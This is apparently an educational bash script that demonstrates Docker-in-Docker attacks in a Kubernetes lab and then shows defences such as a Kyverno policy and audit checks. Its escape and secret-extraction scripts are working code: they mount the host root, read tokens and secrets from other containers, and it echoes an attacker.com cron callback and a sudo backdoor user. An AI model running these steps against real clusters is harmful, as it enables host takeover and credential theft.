#!/bin/bash
# Docker-in-Docker Attack Demonstration and Defense Testing
# WARNING: This script demonstrates dangerous attack techniques for educational purposes only

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${RED}⚠️  DOCKER-IN-DOCKER SECURITY DEMONSTRATION${NC}"
echo "=============================================="
echo -e "${YELLOW}WARNING: This demonstrates dangerous attack techniques${NC}"
echo -e "${YELLOW}Only run in isolated learning environments!${NC}"
echo

# Function to check if a command exists
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# Check prerequisites
echo -e "${BLUE}📋 Checking prerequisites...${NC}"
if ! command_exists kubectl; then
    echo -e "${RED}❌ kubectl not found. Please install kubectl first.${NC}"
    exit 1
fi

if ! command_exists docker; then
    echo -e "${YELLOW}⚠️  Docker not found locally (not required for attacks inside cluster)${NC}"
fi

echo -e "${GREEN}✅ Prerequisites check passed${NC}"
echo

# Deploy vulnerable DIND environment
echo -e "${RED}🚀 Deploying VULNERABLE Docker-in-Docker environment...${NC}"
echo -e "${YELLOW}WARNING: This creates serious security vulnerabilities!${NC}"
kubectl apply -f 01-vulnerable-dind.yaml

echo "⏳ Waiting for vulnerable DIND deployment to be ready..."
kubectl wait --for=condition=available --timeout=300s deployment/vulnerable-dind-builder -n vulnerable-dind || true
kubectl wait --for=condition=available --timeout=300s deployment/target-app -n vulnerable-dind || true

echo -e "${GREEN}✅ Vulnerable environment deployed${NC}"
echo

echo -e "${RED}💀 ATTACK DEMONSTRATION: Container Escape via Docker Socket${NC}"
echo "================================================================"

# Get the DIND pod for attacks
DIND_POD=$(kubectl get pods -n vulnerable-dind -l app=dangerous-builder -o jsonpath='{.items[0].metadata.name}')
if [[ -z "$DIND_POD" ]]; then
    echo -e "${RED}❌ Could not find vulnerable DIND pod${NC}"
    exit 1
fi

echo -e "${YELLOW}🎯 Target pod: $DIND_POD${NC}"
echo

# Attack 1: Verify Docker socket access
echo -e "${BLUE}Attack 1: Verifying Docker socket access...${NC}"
kubectl exec -n vulnerable-dind $DIND_POD -c build-runner -- docker version || echo "Docker version check failed"
echo

# Attack 2: List containers on the host
echo -e "${BLUE}Attack 2: Listing all containers on the host...${NC}"
kubectl exec -n vulnerable-dind $DIND_POD -c build-runner -- docker ps -a || echo "Container listing failed"
echo

# Attack 3: Create privileged container with host filesystem access
echo -e "${BLUE}Attack 3: Creating privileged container with host access...${NC}"
cat << 'EOF' > /tmp/escape-script.sh
#!/bin/bash
echo "=== CONTAINER ESCAPE DEMONSTRATION ==="
echo "Creating privileged container with full host access..."

# Create a privileged container that mounts the host filesystem
docker run -d --name host-escape \
  --privileged \
  --pid=host \
  --net=host \
  --ipc=host \
  -v /:/host \
  alpine:latest \
  sleep 3600

if [ $? -eq 0 ]; then
    echo "✅ Privileged container created successfully!"
    echo "🚨 We now have ROOT access to the host system!"
    
    # Demonstrate host access
    echo "=== HOST SYSTEM INFORMATION ==="
    docker exec host-escape chroot /host cat /etc/hostname
    docker exec host-escape chroot /host whoami
    docker exec host-escape chroot /host uname -a
    
    echo "=== HOST PROCESSES ==="
    docker exec host-escape chroot /host ps aux | head -10
    
    echo "=== HOST FILESYSTEM ACCESS ==="
    docker exec host-escape chroot /host ls -la /root/
    
    echo "=== KUBERNETES NODES AND PODS (from host perspective) ==="
    docker exec host-escape chroot /host find /var/lib/kubelet -name "*.log" | head -5
    
    # Clean up the escape container
    docker rm -f host-escape
    echo "🧹 Cleaned up escape container"
else
    echo "❌ Failed to create privileged container"
fi
EOF

kubectl cp /tmp/escape-script.sh vulnerable-dind/$DIND_POD:/tmp/escape-script.sh -c build-runner
kubectl exec -n vulnerable-dind $DIND_POD -c build-runner -- chmod +x /tmp/escape-script.sh
kubectl exec -n vulnerable-dind $DIND_POD -c build-runner -- /tmp/escape-script.sh
echo

# Attack 4: Access secrets from other containers
echo -e "${BLUE}Attack 4: Extracting secrets from other containers...${NC}"
cat << 'EOF' > /tmp/secret-extraction.sh
#!/bin/bash
echo "=== SECRET EXTRACTION DEMONSTRATION ==="

# List all running containers
echo "Looking for containers with secrets..."
docker ps --format "table {{.Names}}\t{{.Image}}\t{{.Status}}"

# Try to access secrets from target app containers
for container in $(docker ps --format "{{.Names}}" | grep target-app); do
    echo "=== Extracting secrets from: $container ==="
    
    # Extract environment variables
    echo "Environment variables:"
    docker exec $container env | grep -E "(SECRET|PASSWORD|TOKEN|KEY)" || echo "No obvious secrets in env"
    
    # Look for mounted secrets
    echo "Mounted secrets:"
    docker exec $container find /etc/secrets -type f -exec cat {} \; 2>/dev/null || echo "No mounted secrets found"
    
    # Check service account token
    echo "Service account token:"
    docker exec $container cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | cut -c1-50 || echo "No service account token"
    
    echo "---"
done
EOF

kubectl cp /tmp/secret-extraction.sh vulnerable-dind/$DIND_POD:/tmp/secret-extraction.sh -c build-runner
kubectl exec -n vulnerable-dind $DIND_POD -c build-runner -- chmod +x /tmp/secret-extraction.sh
kubectl exec -n vulnerable-dind $DIND_POD -c build-runner -- /tmp/secret-extraction.sh
echo

# Attack 5: Install persistent backdoor
echo -e "${BLUE}Attack 5: Installing persistent backdoor (DEMONSTRATION ONLY)...${NC}"
cat << 'EOF' > /tmp/backdoor-demo.sh
#!/bin/bash
echo "=== BACKDOOR INSTALLATION DEMONSTRATION ==="
echo "WARNING: This would install a persistent backdoor in a real attack!"

# Create privileged container to access host
docker run -d --name backdoor-installer \
  --privileged \
  --pid=host \
  -v /:/host \
  alpine:latest \
  sleep 60

if [ $? -eq 0 ]; then
    echo "Installing backdoor via host filesystem access..."
    
    # Show how attacker would install cron job (demonstration only)
    docker exec backdoor-installer chroot /host sh -c "
        echo '# DEMONSTRATION: Malicious cron job (not actually harmful)'
        echo '# */5 * * * * /bin/bash -c \"curl -X POST http://attacker.com/callback\"'
        echo 'In a real attack, this would establish persistent access'
    "
    
    # Show how attacker could create privileged user (demonstration only)
    docker exec backdoor-installer chroot /host sh -c "
        echo 'DEMONSTRATION: How attacker would create backdoor user'
        echo 'useradd -m -s /bin/bash -G sudo backdoor-user'
        echo 'echo \"backdoor-user ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers'
    "
    
    # Cleanup
    docker rm -f backdoor-installer
    echo "🧹 Cleaned up backdoor installer"
    echo "🚨 In a real attack, the backdoor would remain on the host!"
else
    echo "❌ Failed to create backdoor installer"
fi
EOF

kubectl cp /tmp/backdoor-demo.sh vulnerable-dind/$DIND_POD:/tmp/backdoor-demo.sh -c build-runner
kubectl exec -n vulnerable-dind $DIND_POD -c build-runner -- chmod +x /tmp/backdoor-demo.sh
kubectl exec -n vulnerable-dind $DIND_POD -c build-runner -- /tmp/backdoor-demo.sh
echo

echo -e "${GREEN}🛡️  DEPLOYING SECURE ALTERNATIVES${NC}"
echo "=================================="

# Deploy secure build alternatives
kubectl apply -f 02-secure-alternatives.yaml

echo "⏳ Waiting for secure build jobs to complete..."
sleep 10

# Check Kaniko build
echo -e "${BLUE}📋 Kaniko secure build status:${NC}"
kubectl get jobs -n secure-builds -l app=kaniko-builder || echo "Kaniko job not found"
kubectl logs -n secure-builds job/kaniko-secure-build --tail=10 || echo "Kaniko logs not available yet"

echo

# Check Buildah build
echo -e "${BLUE}📋 Buildah secure build status:${NC}"
kubectl get jobs -n secure-builds || echo "Buildah job not found"
kubectl logs -n secure-builds job/buildah-secure-build --tail=10 || echo "Buildah logs not available yet"

echo

echo -e "${BLUE}🔒 SECURITY POLICY ENFORCEMENT${NC}"
echo "=============================="

# Deploy admission controller policies to prevent DIND
cat << 'EOF' > /tmp/prevent-dind-policy.yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: prevent-dind-attacks
spec:
  validationFailureAction: enforce
  background: false
  rules:
  - name: block-docker-socket
    match:
      any:
      - resources:
          kinds:
          - Pod
    validate:
      message: "Docker socket mounting is prohibited for security"
      pattern:
        spec:
          =(volumes):
          - =(hostPath):
              =(path): "!/var/run/docker.sock"
  - name: block-privileged-containers
    match:
      any:
      - resources:
          kinds:
          - Pod
    validate:
      message: "Privileged containers are prohibited"
      pattern:
        spec:
          =(securityContext):
            =(privileged): "false"
          containers:
          - name: "*"
            =(securityContext):
              =(privileged): "false"
EOF

echo "📋 Security policy to prevent DIND attacks:"
cat /tmp/prevent-dind-policy.yaml

echo

echo -e "${BLUE}📊 SECURITY ASSESSMENT${NC}"
echo "====================="

echo "🔍 Checking for privileged containers:"
kubectl get pods --all-namespaces -o jsonpath='{range .items[*]}{.metadata.namespace}{"\t"}{.metadata.name}{"\t"}{.spec.containers[*].securityContext.privileged}{"\n"}{end}' | grep true || echo "No privileged containers found in other namespaces"

echo
echo "🔍 Checking for Docker socket mounts:"
kubectl get pods --all-namespaces -o yaml | grep -B5 -A5 "docker.sock" || echo "No Docker socket mounts found in other namespaces"

echo
echo "🔍 Checking for host filesystem mounts:"
kubectl get pods --all-namespaces -o yaml | grep -B5 -A5 'path: "/"' || echo "No root filesystem mounts found in other namespaces"

echo

echo -e "${GREEN}📚 DEFENSE RECOMMENDATIONS${NC}"
echo "==========================="
echo "1. ✅ Use Kaniko, Buildah, or cloud build services instead of DIND"
echo "2. ✅ Implement admission controllers to block dangerous configurations"
echo "3. ✅ Use Pod Security Standards to enforce security contexts"
echo "4. ✅ Implement network policies to isolate build workloads"
echo "5. ✅ Use minimal RBAC permissions for build service accounts"
echo "6. ✅ Scan container images for vulnerabilities before deployment"
echo "7. ✅ Monitor for suspicious Docker API calls with Falco"
echo "8. ✅ Use dedicated, isolated nodes for build workloads"

echo

echo -e "${BLUE}🧹 CLEANUP COMMANDS${NC}"
echo "=================="
echo "To remove all test resources:"
echo "kubectl delete namespace vulnerable-dind"
echo "kubectl delete namespace secure-builds"

echo

echo -e "${RED}⚠️  CRITICAL SECURITY REMINDER${NC}"
echo "==============================="
echo "Docker-in-Docker configurations create CRITICAL security vulnerabilities:"
echo "• Complete container escape to host system"
echo "• Root access to underlying node"
echo "• Access to all containers on the node"
echo "• Ability to install persistent backdoors"
echo "• Complete cluster compromise potential"
echo ""
echo "NEVER use DIND patterns in production environments!"
echo "Always use secure alternatives like Kaniko or Buildah."

# Cleanup temporary files
rm -f /tmp/escape-script.sh /tmp/secret-extraction.sh /tmp/backdoor-demo.sh /tmp/prevent-dind-policy.yaml

echo -e "${GREEN}✅ DIND Security Demonstration Complete!${NC}"